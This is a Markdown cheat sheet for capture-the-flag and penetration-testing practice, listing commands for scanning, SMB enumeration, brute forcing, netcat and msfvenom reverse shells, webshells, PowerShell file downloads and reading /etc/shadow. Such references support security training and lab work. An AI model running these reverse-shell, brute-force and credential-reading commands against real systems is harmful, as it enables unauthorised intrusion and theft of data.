---
title: Yet Another CTF Playbook
subtitle: Version 1
author:
    - christalib
date: June/July 2020
titlepage: true
titlepage-color: ffffff
urlcolor: #370000
titlepage-rule-color: 370000
titlepage-text-color: 000000
table-of-contents: true
toc-depth: 4
number-sections: true
toc-title: "Table of Contents"
---

# Reconnaissance

## Nmap

Quickstart:

```sh
nmap -sC -sV --top-ports 20 <IP> -o <FILE>
nmap -sC -sV --open --reason <IP> -o <FILE>
```

Full ports scan:

```sh
nmap -sV -sC -p- -O --open <IP> -o <FILE>
```

Ping sweep:

```sh
nmap -sn -PE <IP or Range>
```

UDP scan:

```sh
nmap -sU <IP or Range>
```

Scan for open ports, determine open services:

```sh
nmap --open -sV <IP or Range>
```

Scan and run default scrips:

```sh
nmap -sC <IP or Range>
```

Run a specific script:

```sh
# location on Kali: /usr/share/nmap/scripts/
nmap --script <SCRIPT_NAME> <IP>
```

Skip ping:

```sh
nmap -Pn <IP>
```

Output result to file:

```sh
nmap <IP> -o <FILE> # text file
nmap <IP> -oG <FiLE> # greppable file
nmap <IP> -oN <FILE> # nmap file
nmap <IP> -oA <FILE> # all formats
```


### Analysing results

#### Port 21 open

* connect with `ftp IP`
* check for `anonymous:anonymous` login

#### Port 22 open

* possible default credentials, try a small `hydra` bruteforce:
```sh
hydra -L users.txt -P pass.txt IP ssh
```
* **Post-exploitation**: possible writable `~/.ssh/authorized_keys`.

[Go to Post-Exploitation](#post-exploitation)

#### Port 80 open

* Web-service running, use `dirb` or `gobuster` to get the most information as possible.

*Examples*:

* `dirb http://IP -r`
* `gobuster dir -w DICT -t 30 -x php,txt,js,html,css` You can use `-f` to try folders instead of files
* if you plan to bruteforce, try generate wordlist with `CeWL`
* if it's a Wordpress instance look into `wpscan`
* sometimes an open FTP is also a feature from a running IIS instance which comes with a CalDav instance. Try it out with `davtest` and exploit with `cadaver`

**Reverse proxy misconfiguration**:

* Sometimes, servers have a misconfiured reverse proxy. Thus, you
need to add the hostnames that resolve to your target IP to your `/etc/hosts`
file:
```sh
<IP> <HOSTNAME>
```

**Common exploits**:

* XSS
* SQLi
* Directory Traversal
* Default credentials (admin:admin, root:root... Check also the name of the service or the default password for the running application.)
* if CGI-bin, check for Shellshock (TODO)

[Go to Exploitation](#exploitation)

#### Port 443 open

* if the server only accepts localhost (you get that through the SSL certificate
  details), you will need to tunnel your connection through a user (needs already a first access to the server)

**Common exploits**:

* [Heartbleed](https://gist.github.com/10174134.git)

#### Port 111, 139, 445 open

Check for Samba, Netbios or NFS shares.

* Netbios

Basic scan:

```sh
nbtscan <IP>
```

* SMB

List services available:

```sh
smbclient -L <IP>
smbmap -H <IP>
```

List permissions:

```sh
smbclient -H <IP>
```

List content:

```sh
smbmap -R -H <IP>
```

Basic connection:

```sh
smbclient //<IP>/<PATH> -U <USER> -P <PASSWORD>
```


Get all files from remote:

```sh
smbclient //<IP>/<PATH> -c "prompt OFF; recurse ON; cd '\<PATH>\'; lcd
'<LOCAL_PATH>'; mget *"
```

**Common exploits**:

* Login with no password
* ETERNALBLUE: Spawn a reverse shell and use Helviojunior's [script](https://github.com/helviojunior/MS17-010), `send_and_execute.py`to send payload


* Existing NFS mount

* Mount the file system on your computer:
```sh
mkdir temp
mount -o nolock IP:/ $PWD/temp
```

#### Existing databases

**MsSQL**:

```sh
sqsh -S <IP> -U <USER> -P <PASSWORD>
# known elevation technique for MsSQL
xp_cmdshell 'whoami';
go
```

**MongoDB**:

```sh
mongo -u <USER> -p <PASSWORD> <HOST:PORT/DB>
# get mongo shell
> db
> show collections
> db.task.find()
> db.task.insert(<EXPLOIT>)
```



## NSLookup

Basic lookup:

```sh
nslookup server <IP>
```

## Host

Basic usage:

```sh
host <IP>
```

Zone transfert:

```sh
host -l <DOMAIN> <IP>
```

# Exploitation

## Searchsploit

Basic usage:

```sh
searchsploit <KEYWORDS>
```

Copy path to clipboard:

```sh
searchsploit -p <ID>
```

Copy to current folder:

```sh
searchsploit -m <ID>
```

Get online link instead of local paths:

```sh
searchsploit -w <KEYWORDS>
```

## Shells

### Netcat

Basic bind shell:
```sh
nc -nvlp 443           # On local Kali
nc -nv <REMOTE-IP> 443 # On remote
```

Basic reverse shell:

```sh
sudo nc -nlvp 443                  # On local Kali
nc -nv <LOCAL-IP> 443 -e cmd.exe   # On remote Windows
nc -nv <LOCAL-IP> 443 -e /bin/bash # On remote Linux
```
Sending files:

```sh
sudo nc -nvlp 443 > incoming.exe     # Reciever
nc -nv <LOCAL-IP> 443 < incoming.exe # Sender
```

## Metasploit shells:

Windows shell which doesn't break the application for a x86 architecture:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o sploit.exe
```

## Webshells

* PentestMonkey PHP [webshell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
* Kali's Webshells: `locate webshells`

## cURL

Upload file:

```sh
curl <IP> --upload-file <FILE>
```

Query as a bot:

```sh
curl -A "'Mozilla/5.0 (compatible;Googlebot/2.1; +http://www.google.com/bot.html)')" <IP>
```

Give parameters with encoding:

```sh
curl <IP> --data-urlencode urlConfig=<PATH>
```

Send request as logged user:

```sh
curl -u <USER> <IP> --data-binary <PAYLOAD>
```

## Powershell

Download remote files:

```powershell
powershell "(New-Object System.Net.WebClient).DownloadFile("<IP+file>",
<Destination-File>)"
```


# Post-Exploitation

## Improve your shell

* `sh -c uname -a; w; id; /bin/bash -i`
* For NMAP versions 2.0 to 5.8:
```sh
nmap --interactive
!sh
```
* `python -c 'import pty; pty.spawn("/bin/bash")'`
* `stty raw -echo` and then `fg` and `export TERM=xterm`

## Local Recon

### Windows

General recon:

```
whoami
hostname
systeminfo
ipconfig /all
```

Network discovery:

```
C:\> net view /all
C:\> net view \\<Hostname>
C:\> net users
```

Ping scan:

```
C:\> for \L %I in (1,1,254) do ping -w 30 -n 1 192.168.1.%I | find "Reply" >> output.txt
```

#### Automation

* [WinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)


### Linux

General recon:

```sh
whoami
hostname
ifconfig
id
uname -a
cat /etc/passwd
cat /etc/shadow
cat /etc/*-release
sudo -l
ps -aux
```

Run a command as a user:

```sh
sudo -u <USER>
sudo -i -u <USER>
```

Network discover:

```sh
ifconfig
ip a
```

Ping scan:

```sh
for i in `seq 1 254`; do ping 192.168.1.$i; done
```
#### Automation

* [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
* [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

## Cracking

Decompress with tar:

```sh
tar -C <DEST> -xvf <FILE>
```

### John

### Hydra

### Binwalk

### Steghide

### Fcrackzip

Run as dictionnary mode, try to decompress the target:

```sh
fcrackzip -u -D -p <Wordlist> <FILE>
```

# Custom Scripts

## Aliases

Put them in your `.aliases` file and source it in your `.bashrc` or `.zshrc`.

```sh
alias serve='ruby -run -e httpd . -p 8000'
alias grepip='grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"'
```

# Sources

## Books

* Red Team Field Manual
* Blue Team Field Manual

## Website

* [PenstestMonkey](http://pentestmonkey.net/)
* [Hacktrics.xyz](https://book.hacktricks.xyz/)
* [blog.g0tmi1k.com](https://blog.g0tmi1k.com/)
* [absolom.com](https://www.absolomb.com/)
* [GTFObins](https://gtfobins.github.io/)
* [LOLBas](https://lolbas-project.github.io/#)

## Videos

* [Ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)
